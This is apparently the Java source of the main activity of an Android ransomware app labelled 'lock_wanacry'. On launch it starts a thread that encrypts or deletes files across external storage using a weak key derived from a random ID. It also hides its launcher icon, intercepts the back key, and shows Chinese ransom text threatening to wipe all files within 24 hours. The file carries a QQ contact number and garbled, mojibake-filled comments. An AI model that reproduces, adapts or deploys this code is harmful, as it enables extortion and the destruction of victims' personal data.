package com.chauthoi1211dev_android.lock_wanacry;

import android.app.Activity;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.support.v4.app.FragmentManager;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.appcompat.BuildConfig;
import android.support.v4.app.Fragment;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.widget.Toast;
import java.io.File;
public class MainActivity extends AppCompatActivity {

    public static MainActivity instance;
    static File externalStorageDirectory;
    static String hz;
    static int hzs;
    static String decryptKey;

    ComponentName firstComponentName;
    ComponentName secondComponentName;
    PackageManager packageManager;
    String randomNumber;

    private void disableComponent(ComponentName componentName) {
        packageManager.setComponentEnabledSetting(componentName, 2, 1);
    }

    private void enabledComponent(ComponentName componentName) {
        packageManager.setComponentEnabledSetting(componentName, 1, 1);
    }

    private void setIconSc() {
        disableComponent(this.firstComponentName);
        enabledComponent(this.secondComponentName);
    }

    /*
    * �^���{�k���n׿�^���{�k���n׿�^���{�k���n׿y�^���{�k���n׿t�^���{�k��֮׷{�^���{�k��֮׷y�^���{�k��֮׷<�^���{�k��֮׷u�^���{�k��֮׷z�^���{�k��֮׷<�^���{�k��֮׷x�^���{�k��֮׷Z�^���{�k��֮׷�^���{�k��֮׷Z�^���{�k���n׿9�^���{�k���n׿9�^���{k˵�ͮ׿z�^���{i����.׶��^���{m���ޮ׿{�^���{w����n׿:�^���{w����n׶��^�n�{w����n׶��^���{w����.׶��^���{w����.׿:�^�n�{w���ͮ׿Z�^���{{
    * ��xv�������������v�������M4��_j���
    * ��xv�������������v�������M4��_j���
    * QQ1279525738
    * */
    @Override protected void onCreate(Bundle bundle) {
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        packageManager = getApplicationContext().getPackageManager();
        firstComponentName = new ComponentName(getBaseContext(), "com.chauthoi1211dev_android.lock_wanacry.MainActivity");
        secondComponentName = new ComponentName(getBaseContext(), "com.chauthoi1211dev_android.lock_wanacry.MainActivity.tr33t1211244773");

        super.onCreate(bundle);
        setContentView(R.layout.activity_home);

        instance = this;

        getSupportFragmentManager().beginTransaction()
                .replace(R.id.frame_content, new MainActivity_EncryptFragment())
                .commit();

        SharedPreferences sharedPreferences = getSharedPreferences("XH", 0);
        if (sharedPreferences.getString("bah", BuildConfig.VERSION_NAME)
                .equals(BuildConfig.VERSION_NAME)) {
            randomNumber =
                    BuildConfig.VERSION_NAME + (((int) (Math.random() * ((double) 1000000))) + 10000000);
            Editor edit = sharedPreferences.edit();
            edit.putString("bah", randomNumber);
            edit.commit();
        } else {
            randomNumber = sharedPreferences.getString("bah", BuildConfig.VERSION_NAME);
        }
        /*
        ASCII convert UTF-8
       * ៗគ៑តៗគ៑ណៗគ៑ផៗគ៑ថៗគរៗៗគរ៕ៗគរៈៗគរ៑ៗគរ៖ៗគរៈៗគរ។ៗគរ៚ៗគរ៌ៗគរ៚ៗគ៑ចៗគ៑ច៖ឨគព៖ឪឬឪ៕ឺពភ៩៖ឹឆៗ៕ឹឤឋ៕ឹឤយ៖ឨឤ៑៖ឨឆលៗគរង៩ => \u17d7\u1782\u17d1\u178f\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u1790\u17d7\u1782\u179a\u17d7\u17d7\u1782\u179a\u17d5\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d1\u17d7\u1782\u179a\u17d6\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d4\u17d7\u1782\u179a\u17da\u17d7\u1782\u179a\u17cc\u17d7\u1782\u179a\u17da\u17d7\u1782\u17d1\u1785\u17d7\u1782\u17d1\u1785\u17d6\u17a8\u1782\u1796\u17d6\u17aa\u17ac\u17aa\u17d5\u17ba\u1796\u1797\u17e9\u17d6\u17b9\u1786\u17d7\u17d5\u17b9\u17a4\u178b\u17d5\u17b9\u17a4\u1799\u17d6\u17a8\u17a4\u17d1\u17d6\u17a8\u1786\u179b\u17d7\u1782\u179a\u1784\u17e9
       * */
        hz = MainActivity_Utils.l(
                "\u6211\u89C9\u5F97\u4F60\u7684\u624B\u673A\u6B63\u5904\u4E8E\u5371\u9669\u4E4B\u4E2D\uFF0C\u5BF9\u6211\u6765\u8BF4\u662F\u4E00\u4E2A\u9ED1\u5BA2\uFF0C\u6211\u529D\u4F60\u5FEB\u901F\u6062\u590D\u6587\u4EF6\u52A0\u5BC6\u7684\u6587\u4EF6\uFF0C\u6211\u4E0A\u9762\u3002\u7531\u4E8E\u572824\u5C0F\u65F6\u5185\uFF0C\u5982\u679C\u4F60\u6CA1\u6709\u4FEE\u590D\uFF0C\u6076\u610F\u8F6F\u4EF6\u4F1A\u5220\u9664\u60A8\u7684\u5C0F\u578B\u8BBE\u5907\u4E0A\u7684\u6240\u6709\u6587\u4EF6\u90FD\u5C06\u88AB\u6E05\u9664\u5E72\u51C0\u3002")
                + randomNumber;
        decryptKey = BuildConfig.VERSION_NAME + (Integer.parseInt(this.randomNumber) + 520);
        hzs = hz.length();
        externalStorageDirectory =
                new File(String.valueOf(Environment.getExternalStorageDirectory()) + "/");

        if (sharedPreferences.getInt("cs", 0) >= 2) {
            setTitle("Lycorisradiata");
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.frame_content, new MainActivity_Fragment())
                    .commit();
            MainActivity_Utils.bz(this);
        }

        if (sharedPreferences.getInt("sss", 0) == 0) {
            new Thread(new Runnable() {
                @Override public void run() {
                    MainActivity_Utils.deleteDir(externalStorageDirectory.toString(), decryptKey, 1, MainActivity.this);
                }
            }).start();
            return;
        }

        setTitle("Lycorisradiata");
        getSupportFragmentManager().beginTransaction()
                .replace(R.id.frame_content, new MainActivity_Fragment())
                .commit();
        MainActivity_Utils.bz(this);
        setIconSc();
    }

    /*
    * 配置文件中 请勿退出！=> u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01
    * */
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent keyEvent) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            Toast.makeText(this, (getSupportFragmentManager().findFragmentById(
                    R.id.frame_content)) instanceof MainActivity_EncryptFragment
                    ? "\u6211\u8BA4\u4E3A\u4F60\u662F\u9EBB\u70E6\u548C\u4E0D\u53D1\u9001\u7684\u4FE1\u606F\u4E0D\u505A\u4EFB\u4F55\u4E8B"
                    : "Please do not quit the software, or the file may never be recovered!", Toast.LENGTH_LONG)
                    .show();
        }
        return true;
    }

    /*
    * 配置文件中 请勿退出！=> \u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01
    *
    * */
    @Override protected void onPause() {
        if (getSupportFragmentManager().findFragmentById(
                R.id.frame_content) instanceof MainActivity_EncryptFragment) {
            SharedPreferences sharedPreferences = getSharedPreferences("XH", 0);
            Editor edit = sharedPreferences.edit();
            edit.putInt("cs", sharedPreferences.getInt("cs", 0) + 1);
            edit.commit();

            Toast.makeText(this, "\u6211\u8BA4\u4E3A\u4F60\u662F\u9EBB\u70E6\u548C\u4E0D\u53D1\u9001\u7684\u4FE1\u606F\u4E0D\u505A\u4EFB\u4F55\u4E8B",
                    Toast.LENGTH_LONG).show();
        } else {
            Toast.makeText(this, "Please do not quit the software, or the file may never be recovered!",
                    Toast.LENGTH_LONG).show();
        }

        super.onPause();
    }

    @Override protected void onResume() {
        if ((getSupportFragmentManager().findFragmentById(
                R.id.frame_content) instanceof MainActivity_EncryptFragment)
                && getSharedPreferences("XH", 0).getInt("cs", 0) >= 2) {
            setTitle("Lycorisradiata");
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.frame_content, new MainActivity_Fragment())
                    .commit();
        }

        super.onResume();
    }
}
